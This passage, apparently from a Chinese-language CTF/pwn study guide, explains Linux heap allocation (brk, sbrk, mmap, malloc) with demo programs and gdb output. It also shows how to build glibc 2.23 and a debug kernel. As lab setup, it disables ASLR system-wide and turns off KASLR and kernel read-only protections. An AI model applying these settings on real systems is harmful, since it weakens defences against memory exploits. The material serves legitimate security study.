\u5b57\u8282\uff09\u7c7b\u578b\u6216\u8005\u5360\u66f4\u5c11\u5b57\u8282\u7684\u53c2\u6570\u88ab\u653e\u5165\u5bc4\u5b58\u5668\uff0c\u5176\u4ed6\u5269\u4e0b\u7684\u53c2\u6570\u6309\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u5165\u6808 @\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 \u9664\u4e86\u53c2\u6570\u7684\u4f20\u9012\u4e4b\u5916\uff0c\u51fd\u6570\u4e0e\u8c03\u7528\u65b9\u8fd8\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u503c\u8fdb\u884c\u4ea4\u4e92\u3002\u5f53\u8fd4\u56de\u503c\u4e0d\u5927\u4e8e 4 \u5b57\u8282\u65f6\uff0c\u8fd4\u56de\u503c\u5b58\u50a8\u5728 eax \u5bc4\u5b58\u5668\u4e2d\uff0c\u5f53\u8fd4\u56de\u503c\u5728 5~8 \u5b57\u8282\u65f6\uff0c\u91c7\u7528 eax \u548c edx \u7ed3\u5408\u7684\u5f62\u5f0f\u8fd4\u56de\uff0c\u5176\u4e2d eax \u5b58\u50a8\u4f4e 4 \u5b57\u8282\uff0c edx \u5b58\u50a8\u9ad8 4 \u5b57\u8282\u3002 \u5806\u4e0e\u5185\u5b58\u7ba1\u7406 \u5806 \u5806\u662f\u7528\u4e8e\u5b58\u653e\u9664\u4e86\u6808\u91cc\u7684\u4e1c\u897f\u4e4b\u5916\u6240\u6709\u5176\u4ed6\u4e1c\u897f\u7684\u5185\u5b58\u533a\u57df\uff0c\u6709\u52a8\u6001\u5185\u5b58\u5206\u914d\u5668\u8d1f\u8d23\u7ef4\u62a4\u3002\u5206\u914d\u5668\u5c06\u5806\u89c6\u4e3a\u4e00\u7ec4\u4e0d\u540c\u5927\u5c0f\u7684\u5757\uff08block\uff09\u7684\u96c6\u5408\u6765\u7ef4\u62a4\uff0c\u6bcf\u4e2a\u5757\u5c31\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u5668\u7247\uff08chunk\uff09\u3002\u5f53\u4f7f\u7528 malloc() \u548c free() \u65f6\u5c31\u662f\u5728\u64cd\u4f5c\u5806\u4e2d\u7684\u5185\u5b58\u3002\u5bf9\u4e8e\u5806\u6765\u8bf4\uff0c\u91ca\u653e\u5de5\u4f5c\u7531\u7a0b\u5e8f\u5458\u63a7\u5236\uff0c\u5bb9\u6613\u4ea7\u751f\u5185\u5b58\u6cc4\u9732\u3002 \u5806\u662f\u5411\u9ad8\u5730\u5740\u6269\u5c55\u7684\u6570\u636e\u7ed3\u6784\uff0c\u662f\u4e0d\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002\u8fd9\u662f\u7531\u4e8e\u7cfb\u7edf\u662f\u7528\u94fe\u8868\u6765\u5b58\u50a8\u7684\u7a7a\u95f2\u5185\u5b58\u5730\u5740\u7684\uff0c\u800c\u94fe\u8868\u7684\u904d\u5386\u65b9\u5411\u662f\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u3002\u5806\u7684\u5927\u5c0f\u53d7\u9650\u4e8e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u6709\u6548\u7684\u865a\u62df\u5185\u5b58\u3002\u7531\u6b64\u53ef\u89c1\uff0c\u5806\u83b7\u5f97\u7684\u7a7a\u95f4\u6bd4\u8f83\u7075\u6d3b\uff0c\u4e5f\u6bd4\u8f83\u5927\u3002 \u5982\u679c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u90fd\u76f4\u63a5\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\uff0c\u4f1a\u4e25\u91cd\u5f71\u54cd\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c\u5e93\u5148\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u6279\u53d1\u201d\u4e00\u5757\u8f83\u5927\u7684\u5806\u7a7a\u95f4\uff0c\u7136\u540e\u201c\u96f6\u552e\u201d\u7ed9\u7a0b\u5e8f\u4f7f\u7528\u3002\u5f53\u5168\u90e8\u201c\u552e\u5b8c\u201d\u4e4b\u540e\u6216\u8005\u5269\u4f59\u7a7a\u95f4\u4e0d\u80fd\u6ee1\u8db3\u7a0b\u5e8f\u7684\u9700\u6c42\u65f6\uff0c\u518d\u6839\u636e\u60c5\u51b5\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u8fdb\u8d27\u201d\u3002 \u8fdb\u7a0b\u5806\u7ba1\u7406 Linux \u63d0\u4f9b\u4e86\u4e24\u79cd\u5806\u7a7a\u95f4\u5206\u914d\u7684\u65b9\u5f0f\uff0c\u4e00\u4e2a\u662f brk() \u7cfb\u7edf\u8c03\u7528\uff0c\u53e6\u4e00\u4e2a\u662f mmap() \u7cfb\u7edf\u8c03\u7528\u3002\u53ef\u4ee5\u4f7f\u7528 man brk \u3001 man mmap \u67e5\u770b\u3002 brk() \u7684\u58f0\u660e\u5982\u4e0b\uff1a #include <unistd.h> int brk(void *addr); void *sbrk(intptr_t increment); \u53c2\u6570 *addr \u662f\u8fdb\u7a0b\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c brk() \u901a\u8fc7\u6539\u53d8\u8be5\u5730\u5740\u6765\u6539\u53d8\u6570\u636e\u6bb5\u7684\u5927\u5c0f\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u9ad8\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u589e\u5927\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u4f4e\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u51cf\u5c0f\u3002 brk() \u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de 0\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002 sbrk() \u4e0e brk() \u7c7b\u4f3c\uff0c\u4f46\u662f\u53c2\u6570 increment \u8868\u793a\u589e\u91cf\uff0c\u5373\u589e\u52a0\u6216\u51cf\u5c11\u7684\u7a7a\u95f4\u5927\u5c0f\uff0c\u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de\u589e\u52a0\u540e\u51cf\u5c0f\u524d\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002 \u5728\u4e0a\u56fe\u4e2d\u6211\u4eec\u770b\u5230 brk \u6307\u793a\u5806\u7ed3\u675f\u5730\u5740\uff0cstart_brk \u6307\u793a\u5806\u5f00\u59cb\u5730\u5740\u3002BSS segment \u548c heap \u4e4b\u95f4\u6709\u4e00\u6bb5 Random brk offset\uff0c\u8fd9\u662f\u7531\u4e8e ASLR \u7684\u4f5c\u7528\uff0c\u5982\u679c\u5173\u95ed\u4e86 ASLR\uff0c\u5219 Random brk offset \u4e3a 0\uff0c\u5806\u7ed3\u675f\u5730\u5740\u548c\u6570\u636e\u6bb5\u5f00\u59cb\u5730\u5740\u91cd\u5408\u3002 \u4f8b\u5b50\uff1a \u6e90\u7801 #include <stdio.h> #include <unistd.h> void main() { void *curr_brk, *tmp_brk, *pre_brk; printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid()); tmp_brk = curr_brk = sbrk(0); printf(\"\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); pre_brk = sbrk(4096); curr_brk = sbrk(0); printf(\"sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a%p\\n\", pre_brk); printf(\"sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"\u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk); getchar(); } \u5f00\u542f\u4e24\u4e2a\u7ec8\u7aef\uff0c\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u7a0b\u5e8f\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u89c2\u5bdf\u5185\u5b58\u5730\u5740\u3002\u9996\u5148\u6211\u4eec\u770b\u5173\u95ed\u4e86 ASLR \u7684\u60c5\u51b5\u3002\u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-56579000 rw-p 00000000 00:00 0 [heap] ... \u6570\u636e\u6bb5\u7ed3\u675f\u5730\u5740\u548c\u5806\u5f00\u59cb\u5730\u5740\u540c\u4e3a 0x56558000 \uff0c\u5806\u7ed3\u675f\u5730\u5740\u4e3a 0x56579000 \u3002 \u7b2c\u4e8c\u6b65\u4f7f\u7528 brk() \u589e\u52a0\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-5657a000 rw-p 00000000 00:00 0 [heap] ... \u5806\u5f00\u59cb\u5730\u5740\u4e0d\u53d8\uff0c\u7ed3\u675f\u5730\u5740\u589e\u52a0\u4e3a 0x5657a000 \u3002 \u7b2c\u4e09\u6b65\u4f7f\u7528 sbrk() \u589e\u52a0\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000 sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-5657b000 rw-p 00000000 00:00 0 [heap] ... \u7b2c\u56db\u6b65\u51cf\u5c0f\u5806\u7a7a\u95f4\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a27759 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000 sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000 sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000 \u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000 # cat /proc/27759/maps ... 56557000-56558000 rw-p 00001000 08:01 28587506 /home/a.out 56558000-56579000 rw-p 00000000 00:00 0 [heap] ... \u518d\u6765\u770b\u4e00\u4e0b\u5f00\u542f\u4e86 ASLR \u7684\u60c5\u51b5\uff1a # echo 2 > /proc/sys/kernel/randomize_va_space $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28025 \u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x578ad000 # cat /proc/28025/maps ... 5663f000-56640000 rw-p 00001000 08:01 28587506 /home/a.out 5788c000-578ad000 rw-p 00000000 00:00 0 [heap] ... \u53ef\u4ee5\u770b\u5230\u8fd9\u65f6\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740 0x56640000 \u4e0d\u7b49\u4e8e\u5806\u7684\u5f00\u59cb\u5730\u5740 0x5788c000 \u3002 mmap() \u7684\u58f0\u660e\u5982\u4e0b\uff1a #include <sys/mman.h> void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); mmap() \u51fd\u6570\u7528\u4e8e\u521b\u5efa\u65b0\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u5bf9\u8c61\u6620\u5c04\u5230\u8fd9\u4e9b\u533a\u57df\u4e2d\uff0c\u5f53\u5b83\u4e0d\u5c06\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u6211\u4eec\u79f0\u8fd9\u5757\u7a7a\u95f4\u4e3a\u533f\u540d\uff08Anonymous\uff09\u7a7a\u95f4\uff0c\u533f\u540d\u7a7a\u95f4\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u5806\u7a7a\u95f4\u3002 mmap() \u51fd\u6570\u8981\u6c42\u5185\u6838\u521b\u5efa\u4e00\u4e2a\u4ece\u5730\u5740 addr \u5f00\u59cb\u7684\u65b0\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26 fildes \u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u4e00\u4e2a\u8fde\u7eed\u7684\u7247\uff08chunk\uff09\u6620\u5c04\u5230\u8fd9\u4e2a\u65b0\u533a\u57df\u3002\u8fde\u7eed\u7684\u5bf9\u8c61\u7247\u5927\u5c0f\u4e3a len \u5b57\u8282\uff0c\u4ece\u8ddd\u6587\u4ef6\u5f00\u59cb\u5904\u504f\u79fb\u91cf\u4e3a off \u5b57\u8282\u7684\u5730\u65b9\u5f00\u59cb\u3002 prot \u63cf\u8ff0\u865a\u62df\u5185\u5b58\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u4f4d\uff0c flags \u63cf\u8ff0\u88ab\u6620\u5c04\u5bf9\u8c61\u7c7b\u578b\u7684\u4f4d\u7ec4\u6210\u3002 munmap() \u5219\u7528\u4e8e\u5220\u9664\u865a\u62df\u5185\u5b58\u533a\u57df\uff1a #include <sys/mman.h> int munmap(void *addr, size_t len); \u4f8b\u5b50\uff1a \u6e90\u7801 #include <stdio.h> #include <sys/mman.h> #include <unistd.h> void main() { void *curr_brk; printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid()); printf(\"\u521d\u59cb\u5316\u540e\\n\"); getchar(); char *addr; addr = mmap(NULL, (size_t)4096, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0); printf(\"mmap \u5b8c\u6210\\n\"); getchar(); munmap(addr, (size_t)4096); printf(\"munmap \u5b8c\u6210\\n\"); getchar(); } \u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ef000-f76f1000 rw-p 00000000 00:00 0 ... \u7b2c\u4e8c\u6b65 mmap\uff1a ]$ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e mmap \u5b8c\u6210 # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ee000-f76f1000 rw-p 00000000 00:00 0 ... \u7b2c\u4e09\u6b65 munmap\uff1a $ ./a.out \u5f53\u524d\u8fdb\u7a0b PID\uff1a28652 \u521d\u59cb\u5316\u540e mmap \u5b8c\u6210 munmap \u5b8c\u6210 # cat /proc/28652/maps ... f76b2000-f76b5000 rw-p 00000000 00:00 0 f76ef000-f76f1000 rw-p 00000000 00:00 0 ... \u53ef\u4ee5\u770b\u5230\u7b2c\u4e8c\u884c\u7b2c\u4e00\u5217\u5730\u5740\u4ece f76ef000 -> f76ee000 -> f76ef000 \u53d8\u5316\u3002 0xf76ee000-0xf76ef000=0x1000=4096 \u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 brk() \u548c mmap() \u6765\u5206\u914d\u5806\u7a7a\u95f4\uff0cC \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb\u505a malloc \u7684\u5206\u914d\u5668\uff0c\u7a0b\u5e8f\u901a\u8fc7\u8c03\u7528 malloc() \u51fd\u6570\u6765\u4ece\u5806\u4e2d\u5206\u914d\u5757\uff0c\u58f0\u660e\u5982\u4e0b\uff1a #include <stdlib.h> void *malloc(size_t size); void free(void *ptr); void *calloc(size_t nmemb, size_t size); void *realloc(void *ptr, size_t size); \u793a\u4f8b\uff1a #include<stdio.h> #include<malloc.h> void foo(int n) { int *p; p = (int *)malloc(n * sizeof(int)); for (int i=0; i<n; i++) { p[i] = i; printf(\"%d \", p[i]); } printf(\"\\n\"); free(p); } void main() { int n; scanf(\"%d\", &n); foo(n); } \u8fd0\u884c\u7ed3\u679c\uff1a $ ./malloc 4 0 1 2 3 $ ./malloc 8 0 1 2 3 4 5 6 7 $ ./malloc 16 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a gdb-peda$ disassemble foo Dump of assembler code for function foo: 0x0000066d <+0>: push ebp 0x0000066e <+1>: mov ebp,esp 0x00000670 <+3>: push ebx 0x00000671 <+4>: sub esp,0x14 0x00000674 <+7>: call 0x570 <__x86.get_pc_thunk.bx> 0x00000679 <+12>: add ebx,0x1987 0x0000067f <+18>: mov eax,DWORD PTR [ebp+0x8] 0x00000682 <+21>: shl eax,0x2 0x00000685 <+24>: sub esp,0xc 0x00000688 <+27>: push eax 0x00000689 <+28>: call 0x4e0 <malloc@plt> 0x0000068e <+33>: add esp,0x10 0x00000691 <+36>: mov DWORD PTR [ebp-0xc],eax 0x00000694 <+39>: mov DWORD PTR [ebp-0x10],0x0 0x0000069b <+46>: jmp 0x6d9 <foo+108> 0x0000069d <+48>: mov eax,DWORD PTR [ebp-0x10] 0x000006a0 <+51>: lea edx,[eax*4+0x0] 0x000006a7 <+58>: mov eax,DWORD PTR [ebp-0xc] 0x000006aa <+61>: add edx,eax 0x000006ac <+63>: mov eax,DWORD PTR [ebp-0x10] 0x000006af <+66>: mov DWORD PTR [edx],eax 0x000006b1 <+68>: mov eax,DWORD PTR [ebp-0x10] 0x000006b4 <+71>: lea edx,[eax*4+0x0] 0x000006bb <+78>: mov eax,DWORD PTR [ebp-0xc] 0x000006be <+81>: add eax,edx 0x000006c0 <+83>: mov eax,DWORD PTR [eax] 0x000006c2 <+85>: sub esp,0x8 0x000006c5 <+88>: push eax 0x000006c6 <+89>: lea eax,[ebx-0x17e0] 0x000006cc <+95>: push eax 0x000006cd <+96>: call 0x4b0 <printf@plt> 0x000006d2 <+101>: add esp,0x10 0x000006d5 <+104>: add DWORD PTR [ebp-0x10],0x1 0x000006d9 <+108>: mov eax,DWORD PTR [ebp-0x10] 0x000006dc <+111>: cmp eax,DWORD PTR [ebp+0x8] 0x000006df <+114>: jl 0x69d <foo+48> 0x000006e1 <+116>: sub esp,0xc 0x000006e4 <+119>: push 0xa 0x000006e6 <+121>: call 0x500 <putchar@plt> 0x000006eb <+126>: add esp,0x10 0x000006ee <+129>: sub esp,0xc 0x000006f1 <+132>: push DWORD PTR [ebp-0xc] 0x000006f4 <+135>: call 0x4c0 <free@plt> 0x000006f9 <+140>: add esp,0x10 0x000006fc <+143>: nop 0x000006fd <+144>: mov ebx,DWORD PTR [ebp-0x4] 0x00000700 <+147>: leave 0x00000701 <+148>: ret End of assembler dump. \u5173\u4e8e glibc \u4e2d\u7684 malloc \u5b9e\u73b0\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u8bdd\u9898\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u8be6\u7ec6\u4ecb\u7ecd\u3002 glibc malloc glibc malloc \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6 glibc glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e /usr/include \uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e /lib/libc.so.6 \uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e /usr/lib/libc.a \u3002 \u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u9605\u8bfb\u5206\u6790 glibc \u7684\u6e90\u7801\uff0c\u4e0b\u9762\u5148\u628a\u5b83\u4e0b\u8f7d\u4e0b\u6765\uff0c\u5e76\u5207\u6362\u5230\u6211\u4eec\u9700\u8981\u7684\u7248\u672c\uff1a $ git clone git://sourceware.org/git/glibc.git $ cd glibc $ git checkout --track -b local_glibc-2.23 origin/release/2.23/master \u4e0b\u9762\u6765\u7f16\u8bd1\u5b83\uff0c\u9996\u5148\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 Makeconfig\uff0c\u5c06 -Werror \u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9ad8\u7248\u672c GCC\uff08v8.1.0\uff09 \u5c06\u8b66\u544a\u5f53\u505a\u9519\u8bef\u5904\u7406\uff1a $ cat Makeconfig | grep -i werror | grep warn +gccwarn += #-Werror \u63a5\u4e0b\u6765\u9700\u8981\u6253\u4e0a\u4e00\u4e2a patch\uff1a $ cat regexp.patch diff --git a/misc/regexp.c b/misc/regexp.c index 19d76c0..9017bc1 100644 --- a/misc/regexp.c +++ b/misc/regexp.c @@ -29,14 +29,17 @@ #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23) -/* Define the variables used for the interface. */ -char *loc1; -char *loc2; +#include <stdlib.h> /* Get NULL. */ + +/* Define the variables used for the interface. Avoid .symver on common + symbol, which just creates a new common symbol, not an alias. */ +char *loc1 = NULL; +char *loc2 = NULL; compat_symbol (libc, loc1, loc1, GLIBC_2_0); compat_symbol (libc, loc2, loc2, GLIBC_2_0); /* Although we do not support the use we define this variable as well. */ -char *locs; +char *locs = NULL; compat_symbol (libc, locs, locs, GLIBC_2_0); $ patch misc/regexp.c regexp.patch \u7136\u540e\u5c31\u53ef\u4ee5\u7f16\u8bd1\u4e86\uff1a $ mkdir build && cd build $ ../configure --prefix=/usr/local/glibc-2.23 $ make -j4 && sudo make install \u5982\u679c\u6211\u4eec\u60f3\u8981\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\u6307\u5b9a libc\uff0c\u53ef\u4ee5\u50cf\u8fd9\u6837\uff1a $ gcc -L/usr/local/glibc-2.23/lib -Wl,--rpath=/usr/local/glibc-2.23/lib -Wl,-I/usr/local/glibc-2.23/lib/ld-2.23.so test.c $ ldd a.out linux-vdso.so.1 (0x00007ffcc76b0000) libc.so.6 => /usr/local/glibc-2.23/lib/libc.so.6 (0x00007f6abd578000) /usr/local/glibc-2.23/lib/ld-2.23.so => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f6abdb1c000) \u7136\u540e\u5982\u679c\u5e0c\u671b\u5728\u8c03\u8bd5\u65f6\u6307\u5b9a libc \u7684\u6e90\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u547d\u4ee4 directory \uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u7684\u7f3a\u70b9\u662f\u4e0d\u80fd\u89e3\u6790\u5b50\u76ee\u5f55\uff0c\u6240\u4ee5\u63a8\u8350\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5728\u542f\u52a8\u65f6\u52a0\u8f7d\uff1a gdb `find ~/path/to/glibc/source -type d -printf '-d %p '` ./a.out malloc.c \u4e0b\u9762\u6211\u4eec\u5148\u5206\u6790 glibc 2.23 \u7248\u672c\u7684\u6e90\u7801\uff0c\u5b83\u662f Ubuntu16.04 \u7684\u9ed8\u8ba4\u7248\u672c\uff0c\u5728 pwn \u4e2d\u4e5f\u6700\u5e38\u89c1\u3002\u7136\u540e\uff0c\u6211\u4eec\u518d\u63a2\u8ba8\u65b0\u7248\u672c\u7684 glibc \u4e2d\u6240\u52a0\u5165\u7684\u6f0f\u6d1e\u7f13\u89e3\u673a\u5236\u3002 \u76f8\u5173\u7ed3\u6784 \u5806\u5757\u7ed3\u6784 Allocated Chunk Free Chunk Top Chunk Bins \u7ed3\u6784 Fast Bins Small Bins Large Bins Unsorted Bins Arena \u7ed3\u6784 \u5206\u914d\u51fd\u6570 _int_malloc() \u91ca\u653e\u51fd\u6570 _int_free() \u91cd\u5206\u914d\u51fd\u6570 _int_realloc() Linux \u5185\u6838 \u7f16\u8bd1\u5b89\u88c5 \u7cfb\u7edf\u8c03\u7528 \u53c2\u8003\u8d44\u6599 \u7f16\u8bd1\u5b89\u88c5 \u6211\u7684\u7f16\u8bd1\u73af\u5883\u662f\u5982\u4e0b\u3002\u9996\u5148\u5b89\u88c5\u5fc5\u8981\u7684\u8f6f\u4ef6\uff1a $ uname -a Linux firmy-pc 4.14.34-1-MANJARO #1 SMP PREEMPT Thu Apr 12 17:26:43 UTC 2018 x86_64 GNU/Linux $ yaourt -S base-devel \u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\uff0c\u9009\u62e9\u4e00\u4e2a\u7a33\u5b9a\u7248\u672c\uff0c\u6bd4\u5982\u6700\u65b0\u7684 4.16.3\u3002 $ mkdir ~/kernelbuild && cd ~/kernelbuild $ wget -c https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.16.3.tar.xz $ tar -xvJf linux-4.16.3.tar.xz $ cd linux-4.16.3/ $ make clean && make mrproper \u5185\u6838\u7684\u914d\u7f6e\u9009\u9879\u5728 .config \u6587\u4ef6\u4e2d\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8bbe\u7f6e\u8fd9\u4e9b\u9009\u9879\uff0c\u4e00\u79cd\u662f\u4ece\u5f53\u524d\u5185\u6838\u4e2d\u83b7\u5f97\u4e00\u4efd\u9ed8\u8ba4\u914d\u7f6e\uff1a $ zcat /proc/config.gz > .config $ make oldconfig \u53e6\u4e00\u79cd\u662f\u81ea\u5df1\u751f\u6210\u4e00\u4efd\u914d\u7f6e\uff1a $ make localmodconfig # \u4f7f\u7528\u5f53\u524d\u5185\u6838\u914d\u7f6e\u751f\u6210 # OR $ make defconfig # \u6839\u636e\u5f53\u524d\u67b6\u6784\u9ed8\u8ba4\u7684\u914d\u7f6e\u751f\u6210 \u4e3a\u4e86\u80fd\u591f\u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0b\u9762\u7684\u53c2\u6570\uff1a CONFIG_DEBUG_INFO=y CONFIG_DEBUG_INFO_REDUCED=n CONFIG_GDB_SCRIPTS=y \u5982\u679c\u9700\u8981\u4f7f\u7528 kgdb\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u4e0b\u9762\u7684\u53c2\u6570\uff1a CONFIG_STRICT_KERNEL_RWX=n CONFIG_FRAME_POINTER=y CONFIG_KGDB=y CONFIG_KGDB_SERIAL_CONSOLE=y CONFIG_STRICT_KERNEL_RWX \u4f1a\u5c06\u7279\u5b9a\u7684\u5185\u6838\u5185\u5b58\u7a7a\u95f4\u6807\u8bb0\u4e3a\u53ea\u8bfb\uff0c\u8fd9\u5c06\u963b\u6b62\u4f60\u4f7f\u7528\u8f6f\u4ef6\u65ad\u70b9\uff0c\u6700\u597d\u5c06\u5b83\u5173\u6389\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528 kdb\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\uff1a CONFIG_KGDB_KDB=y CONFIG_KDB_KEYBOARD=y \u53e6\u5916\u5982\u679c\u4f60\u5728\u8c03\u8bd5\u65f6\u4e0d\u5e0c\u671b\u88ab KASLR \u5e72\u6270\uff0c\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u5173\u6389\u5b83\uff1a CONFIG_RANDOMIZE_BASE=n CONFIG_RANDOMIZE_MEMORY=n \u5c06\u4e0a\u9762\u7684\u53c2\u6570\u5199\u5230\u6587\u4ef6 .config-fragment \uff0c\u7136\u540e\u5408\u5e76\u8fdb .config \uff1a $ ./scripts/kconfig/merge_config.sh .config .config-fragment 